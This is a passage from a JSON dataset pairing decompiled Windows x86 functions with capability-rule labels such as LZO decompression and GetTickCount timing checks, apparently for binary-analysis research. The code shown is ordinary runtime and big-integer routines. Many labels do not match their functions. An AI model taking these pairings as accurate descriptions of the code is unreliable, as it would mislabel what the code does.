        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042692e)\n// WARNING: Removing unreachable block (ram,0x0042691f)\n// WARNING: Removing unreachable block (ram,0x00426924)\n// WARNING: Removing unreachable block (ram,0x004268e1)\n\nvoid fcn.004268a0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x549d88 != 2) {\n        if (*0x549d88 != 0) {\n            if (*0x549d88 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x549d88 == 1);\n                if (*0x549d88 == 2) goto code_r0x004268eb;\n            }\n            return;\n        }\n        *0x549d88 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x549da0);\n        (*pcVar1)(0x549db8);\n        fcn.004014c0(0x426970);\n        *0x549d88 = 2;\n    }\ncode_r0x004268eb:\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_EAX * 0x18 + 0x549da0);\n    return;\n}\n",
        "token_count": 329
    },
    "004269b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004269b0(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puStack20;\n    \n    fcn.004268a0();\n    iVar2 = *0x549d88;\n    if (param_1 < 10) {\n        puVar3 = *(param_1 * 4 + 0x549d60);\n        if (puVar3 != NULL) {\n            *(param_1 * 4 + 0x549d60) = *puVar3;\n            goto joined_r0x00426a2c;\n        }\n        iVar4 = 1 << (param_1 & 0x1f);\n        uVar1 = iVar4 * 4 + 0x1b;\n        if (0x120 < (*0x4f5a5c + -0x152518 >> 3) + (uVar1 >> 3)) goto code_r0x00426a00;\n        puVar3 = *0x4f5a5c;\n        *0x4f5a5c = (uVar1 & 0xfffffff8) + *0x4f5a5c;\n    }\n    else {\ncode_r0x00426a00:\n        iVar4 = 1 << (param_1 & 0x1f);\n        puVar3 = sub.msvcrt.dll_malloc(iVar4 * 4 + 0x1bU & 0xfffffff8);\n        if (puVar3 == NULL) {\n            return;\n        }\n    }\n    iVar2 = *0x549d88;\n    puVar3[1] = param_1;\n    puVar3[2] = iVar4;\njoined_r0x00426a2c:\n    if (iVar2 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x549da0);\n        puVar3 = puStack20;\n    }\n    puVar3[4] = 0;\n    puVar3[3] = 0;\n    return;\n}\n",
        "token_count": 469
    },
    "00426d80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00426d80(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (((param_2 & 3) != 0) && (param_1 = fcn.00426af0(param_1, *((param_2 & 3) * 4 + 0x5061bc), 0),  param_1 == 0)) {\n        return 0;\n    }\n    param_2 = param_2 >> 2;\n    if (param_2 != 0) {\n        puVar1 = *0x549440;\n        if (*0x549440 == NULL) {\n            fcn.004268a0();\n            puVar1 = *0x549440;\n            if (*0x549440 == NULL) {\n                puVar1 = fcn.004269b0(1);\n                if (puVar1 == NULL) {\n                    *0x549440 = NULL;\n                    return 0;\n                }\n                puVar1[5] = 0x271;\n                puVar1[4] = 1;\n                *0x549440 = puVar1;\n                *puVar1 = 0;\n            }\n            if (*0x549d88 == 2) {\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x549db8);\n            }\n        }\n        iVar2 = param_1;\n        if ((param_2 & 1) != 0) goto code_r0x00426dd1;\n        while (param_2 = param_2 >> 1,  puVar3 = puVar1,  param_2 != 0) {\n            while( true ) {\n                puVar1 = *puVar3;\n                if (puVar1 == NULL) {\n                    fcn.004268a0();\n                    puVar1 = *puVar3;\n                    if (puVar1 == NULL) {\n                        puVar1 = fcn.00426c10(puVar3, puVar3);\n                        *puVar3 = puVar1;\n                        if (puVar1 == NULL) {\n                            return 0;\n                        }\n                        *puVar1 = 0;\n                    }\n                    if (*0x549d88 == 2) {\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x549db8);\n                    }\n                }\n                iVar2 = param_1;\n                if ((param_2 & 1) == 0) break;\ncode_r0x00426dd1:\n                param_1 = fcn.00426c10(iVar2, puVar1);\n                if (param_1 == 0) {\n                    return 0;\n                }\n                fcn.00426a80(iVar2);\n                param_2 = param_2 >> 1;\n                puVar3 = puVar1;\n                if (param_2 == 0) {\n                    return param_1;\n                }\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 666
    },
    "00427020": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00427020(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    \n    iVar1 = *(param_2 + 0x10);\n    uVar2 = *(param_1 + 0x10) - iVar1;\n    if (uVar2 == 0) {\n        puVar4 = param_1 + 0x14 + iVar1;\n        puVar3 = param_2 + 0x14 + iVar1 * 4;\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            if (*puVar4 != *puVar3) {\n                return -(*puVar4 < *puVar3) | 1;\n            }\n        } while (param_1 + 0x14 < puVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 225
    },
    "00427070": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.00427070(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    bool bVar11;\n    int32_t *piStack60;\n    uint32_t *puStack52;\n    int32_t iStack40;\n    \n    iVar1 = *(param_2 + 0x10);\n    iVar10 = *(param_1 + 0x10) - iVar1;\n    bVar11 = iVar10 < 0;\n    iVar4 = param_1;\n    if (iVar10 == 0) {\n        puVar2 = param_1 + 0x14U + iVar1;\n        puVar5 = param_2 + 0x14 + iVar1 * 4;\n        do {\n            puVar5 = puVar5 + -1;\n            puVar2 = puVar2 + -1;\n            if (*puVar2 != *puVar5) {\n                if (*puVar2 < *puVar5) goto code_r0x004271fb;\n                goto code_r0x004270c0;\n            }\n        } while (param_1 + 0x14U < puVar2);\n        iStack40 = fcn.004269b0(0);\n        if (iStack40 != 0) {\n            *(iStack40 + 0x10) = 1;\n            *(iStack40 + 0x14) = 0;\n            return iStack40;\n        }\n    }\n    else {\n        iVar10 = 0;\n        if (bVar11) {\ncode_r0x004271fb:\n            iVar10 = 1;\n            iVar4 = param_2;\n            param_2 = param_1;\n        }\ncode_r0x004270c0:\n        iStack40 = fcn.004269b0(*(iVar4 + 4));\n        if (iStack40 != 0) {\n            *(iStack40 + 0xc) = iVar10;\n            iVar1 = *(iVar4 + 0x10);\n            puVar2 = iVar4 + 0x14 + iVar1;\n            iVar10 = *(param_2 + 0x10);\n            uVar9 = 0;\n            puVar7 = param_2 + 0x14;\n            piVar6 = iStack40 + 0x14;\n            puVar5 = iVar4 + 0x14;\n            do {\n                puStack52 = puVar5;\n                piStack60 = piVar6;\n                puVar8 = puVar7 + 1;\n                puVar5 = puStack52 + 1;\n                uVar3 = *puStack52 - *puVar7;\n                iVar4 = uVar3 - uVar9;\n                piVar6 = piStack60 + 1;\n                uVar9 = -(uVar3 < uVar9) - (*puStack52 < *puVar7) & 1;\n                *piStack60 = iVar4;\n                puVar7 = puVar8;\n            } while (puVar8 < param_2 + 0x14 + iVar10);\n            iVar10 = iVar1;\n            if (puVar5 < puVar2) {\n                do {\n                    puVar7 = puVar5 + 1;\n                    iVar4 = *puVar5 - uVar9;\n                    uVar9 = -(*puVar5 < uVar9) & 1;\n                    *piVar6 = iVar4;\n                    puVar5 = puVar7;\n                    piVar6 = piVar6 + 1;\n                } while (puVar7 < puVar2);\n                piVar6 = piStack60 + (puVar2 + (-5 - puStack52) & 0xfffffffcU) + 8;\n            }\n            while (iVar4 == 0) {\n                iVar4 = piVar6[(iVar10 + -2) - iVar1];\n                iVar10 = iVar10 + -1;\n            }\n            *(iStack40 + 0x10) = iVar10;\n        }\n    }\n    return iStack40;\n}\n",
        "token_count": 953
    },
    "004276d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.004276d0(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int8_t iVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    \n    iVar2 = *(param_1 + 0x10);\n    puVar1 = param_1 + 0x14;\n    iVar3 = param_2 >> 5;\n    if (iVar2 < iVar3) {\n        puVar7 = puVar1 + iVar2;\n    }\n    else {\n        puVar7 = puVar1 + iVar3;\n        if (((iVar3 < iVar2) && ((param_2 & 0x1f) != 0)) &&\n           (iVar4 = param_2 & 0x1f,  *puVar7 != (*puVar7 >> iVar4) << iVar4)) {\n            return 1;\n        }\n    }\n    if (puVar7 <= puVar1) {\n        return 0;\n    }\n    puVar6 = puVar7 + -1;\n    if (puVar7[-1] == 0) {\n        uVar5 = puVar6 + (3 - puVar1);\n        do {\n            if ((~uVar5 & 0xfffffffc) + puVar7 == puVar6) {\n                return 0;\n            }\n            puVar6 = puVar6 + -1;\n        } while (*puVar6 == 0);\n    }\n    return 1;\n}\n",
        "token_count": 353
    },
    "00427b50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00427b50(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        return 0;\n    }\n    uVar2 = 0;\n    if (*0x5493d4 != 0) {\n        puVar1 = sub.msvcrt.dll_calloc(1, 0xc);\n        if (puVar1 != NULL) {\n            *puVar1 = param_1;\n            puVar1[1] = param_2;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x5493d8);\n            puVar1[2] = *0x5493d0;\n            *0x5493d0 = puVar1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x5493d8);\n            return 0;\n        }\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 220
    },
    "0042e410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042e410(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00432500();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004a3500(0x68);\n    puVar4[1] = 0;\n    *puVar4 = 0x50adf0;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    *(puVar4 + 9) = 0;\n    *(puVar4 + 0x19) = 0;\n    fcn.00487e80(arg_8h);\n    fcn.0048da50(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 324
    },
    "0042e500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042e500(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00432500();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004a3500(0xa8);\n    puVar4[1] = 0;\n    *puVar4 = 0x50ae00;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    *(puVar4 + 0x29) = 0;\n    fcn.00488550(arg_8h);\n    fcn.0048da50(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 321
    },
    "0042e5f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042e5f0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00432500();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004a3500(0x44);\n    *puVar4 = 0x50af14;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    *(puVar4 + 0x43) = 0;\n    fcn.0048a350(arg_8h);\n    fcn.0048da50(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 386
    },
    "0042e700": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042e700(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00432500();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004a3500(0x44);\n    *puVar4 = 0x50af24;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    *(puVar4 + 0x43) = 0;\n    fcn.0048aa30(arg_8h);\n    fcn.0048da50(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 384
    },
    "0042e810": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042e810(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00432500();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004a3500(0x54);\n    puVar4[1] = 0;\n    *puVar4 = 0x50af34;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    puVar4[0xe] = 0;\n    *(puVar4 + 0x52) = 0;\n    fcn.0048b110(arg_8h);\n    fcn.0048da50(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 385
    },
    "0042e920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042e920(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00432500();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004a3500(0x54);\n    puVar4[1] = 0;\n    *puVar4 = 0x50af44;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    puVar4[0xe] = 0;\n    *(puVar4 + 0x52) = 0;\n    fcn.0048b930(arg_8h);\n    fcn.0048da50(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 385
    },
    "0042f9f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0042f9f0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, int32_t *arg_20h\n            , uint *arg_24h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    code *unaff_EBX;\n    ulong uVar3;\n    uint32_t in_stack_ffffff54;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_34h;\n    int32_t var_30h;\n    code *var_1ch;\n    code *var_bp_ch;\n    \n    var_1ch = NULL;\n    var_50h = 0;\n    var_bp_ch = unaff_EBX;\n    uVar3 = fcn.00471d60(in_stack_ffffff54 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_50h, 0, &var_34h);\n    if (var_50h == 0) {\n        if (var_1ch == NULL) {\n            uVar2 = fcn.0049eb30(\"uninitialized __any_string\");\n            if (var_1ch != NULL) {\n                (*var_1ch)(&var_34h);\n            }\n            fcn.0041b360(uVar2);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar3 >> 0x20);\n            }\n            fcn.0041b360(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0041b360(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0041b360(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0041b360(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0041b360(&var_34h);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar2);\n            }\n            fcn.0041b360(&var_34h);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar2);\n            }\n            fcn.0041b360(&var_34h);\n            fcn.0048f380();\n            fcn.004a34c0(&var_34h);\n            fcn.0041b360(uVar2);\n            fcn.0048f380();\n            fcn.004a34c0(&var_34h);\n            fcn.0041b360(uVar2);\n            fcn.0048f380();\n            do {\n                fcn.004a34c0(&var_34h);\n                fcn.0041b360(uVar2);\n                fcn.004a34c0(&var_34h);\n                fcn.0041b360(uVar2);\n                fcn.00433e60();\n                fcn.0048fe90();\n            } while( true );\n        }\n        var_4ch = &var_44h;\n        fcn.00490c10(var_34h, var_30h + var_34h, arg_8h & 0xffffff00);\n        puVar1 = *arg_24h;\n        if (var_4ch == &var_44h) {\n            fcn.00492700(&var_4ch);\n        }\n        else if (puVar1 == arg_24h + 2) {\n            *arg_24h = var_4ch;\n            arg_24h[2] = var_44h;\n            arg_24h[1] = var_48h;\n            var_4ch = &var_44h;\n        }\n        else {\n            uVar2 = arg_24h[2];\n            *arg_24h = var_4ch;\n            arg_24h[1] = var_48h;\n            arg_24h[2] = var_44h;\n            var_4ch = &var_44h;\n            if (puVar1 != NULL) {\n                var_4ch = puVar1;\n                var_44h = uVar2;\n            }\n        }\n        var_5ch = &var_44h;\n        var_48h = 0;\n        *var_4ch = 0;\n        if (var_4ch != var_5ch) {\n            fcn.004a34c0(var_4ch);\n        }\n    }\n    else {\n        *arg_20h = var_50h;\n    }\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar3;\n}\n",
        "token_count": 1216
    },
    "0042fb80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0042fb80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, int32_t *arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    ulong uVar4;\n    uint32_t in_stack_ffffff84;\n    uchar var_3dh;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    var_3ch = 0;\n    uVar4 = fcn.00471ee0(in_stack_ffffff84 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_3ch, 0, &var_34h);\n    if (var_3ch == 0) {\n        if (var_1ch == NULL) {\n            uVar3 = fcn.0049eb30(0x5020d8);\n            fcn.0046bf80(&var_3dh);\n            if (var_1ch != NULL) {\n                (*var_1ch)(&var_34h);\n            }\n            fcn.0041b360(uVar3);\n            fcn.004640c0(&var_3dh);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar4 >> 0x20);\n            }\n            fcn.0041b360(&var_34h);\n            fcn.0048f380();\n            fcn.004a34c0(&var_34h);\n            fcn.0041b360(uVar3);\n            fcn.0048f380();\n            fcn.004a34c0(&var_34h);\n            fcn.0041b360(uVar3);\n            fcn.0048f380();\n            do {\n                fcn.004a34c0(&var_34h);\n                fcn.0041b360(uVar3);\n                fcn.004a34c0(&var_34h);\n                fcn.0041b360(uVar3);\n                fcn.00433e60();\n                fcn.0046e880();\n            } while( true );\n        }\n        fcn.0046d650(var_34h, var_30h, &var_3dh);\n        fcn.0046c1d0(&var_38h);\n        if (*0x4f59f4 == 0) {\n            iVar2 = *(var_38h + -4);\n            *(var_38h + -4) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_38h + -4;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.0046bf60(&var_3dh);\n        }\n    }\n    else {\n        *arg_20h = var_3ch;\n    }\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar4;\n}\n",
        "token_count": 802
    },
    "0042fdc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0042fdc0(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, \n            int32_t *arg_20h, uint *arg_24h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    code *unaff_EBX;\n    uint64_t uVar4;\n    uint32_t in_stack_ffffff54;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_34h;\n    int32_t var_30h;\n    code *var_1ch;\n    code *var_bp_ch;\n    \n    var_1ch = NULL;\n    var_50h = 0;\n    var_bp_ch = unaff_EBX;\n    uVar4 = fcn.00472020(in_stack_ffffff54 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_50h, 0, &var_34h);\n    uVar2 = uVar4;\n    if (var_50h != 0) {\n        *arg_20h = var_50h;\n        goto code_r0x0042fe4b;\n    }\n    if (var_1ch == NULL) {\n        uVar3 = fcn.0049eb30(\"uninitialized __any_string\");\n        if (var_1ch != NULL) {\n            (*var_1ch)(&var_34h);\n        }\n        fcn.0041b360(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0041b360(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0041b360(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0041b360(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0041b360(uVar3);\n        if (var_1ch != NULL) {\n            (*var_1ch)(uVar2);\n        }\n        fcn.0041b360(uVar3);\n        if (var_1ch != NULL) {\n            (*var_1ch)(uVar2);\n        }\n        fcn.0041b360(uVar3);\n        fcn.0048f380();\n        fcn.004a34c0(uVar3);\n        fcn.0041b360(uVar2);\n        fcn.0048f380();\n        fcn.004a34c0(uVar3);\n        fcn.0041b360(uVar2);\n        fcn.0048f380();\n        do {\n            fcn.004a34c0(uVar3);\n            fcn.0041b360(uVar2);\n            fcn.004a34c0(uVar3);\n            fcn.0041b360(uVar2);\n            fcn.00433e60();\n            fcn.0048fe90();\n        } while( true );\n    }\n    var_4ch = &var_44h;\n    fcn.00493990(var_34h, var_34h + var_30h * 2, arg_8h & 0xffffff00);\n    puVar1 = *arg_24h;\n    if (var_4ch == &var_44h) {\n        fcn.00495580(&var_4ch);\n        puVar1 = var_4ch;\n        uVar2 = var_44h;\n    }\n    else {\n        if (puVar1 == arg_24h + 2) {\n            *arg_24h = var_4ch;\n            arg_24h[1] = var_48h;\n            arg_24h[2] = var_44h;\n            goto code_r0x0042fe4b;\n        }\n        uVar2 = arg_24h[2];\n        *arg_24h = var_4ch;\n        arg_24h[1] = var_48h;\n        arg_24h[2] = var_44h;\n        if (puVar1 == NULL) goto code_r0x0042fe4b;\n    }\n    var_44h = uVar2;\n    var_4ch = puVar1;\n    var_48h = 0;\n    *var_4ch = 0;\n    if (var_4ch != &var_44h) {\n        fcn.004a34c0(var_4ch);\n    }\ncode_r0x0042fe4b:\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar4 & 0xffffffff | (arg_ch & 0xffff0000 | uVar4 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 1226
    },
    "0042ff40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0042ff40(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, int32_t *arg_20h\n            , uint arg_24h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint64_t uVar5;\n    uint32_t in_stack_ffffff74;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_3dh;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    var_3ch = 0;\n    uVar5 = fcn.004721b0(in_stack_ffffff74 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_3ch, 0, &var_34h);\n    uVar2 = uVar5;\n    if (var_3ch == 0) {\n        if (var_1ch == NULL) {\n            uVar4 = fcn.0049eb30(0x5020d8);\n            fcn.004640c0(&var_3dh);\n            if (var_1ch != NULL) {\n                (*var_1ch)(&var_34h);\n            }\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(uVar2);\n            fcn.0048f380();\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(uVar2);\n            fcn.0048f380();\n            do {\n                fcn.004a34c0(uVar4);\n                fcn.0041b360(uVar2);\n                fcn.004a34c0(uVar4);\n                fcn.0041b360(uVar2);\n                fcn.00433e60();\n                fcn.0046e880();\n            } while( true );\n        }\n        fcn.004658c0(var_34h, var_30h, &var_3dh);\n        fcn.00464330(&var_38h);\n        if 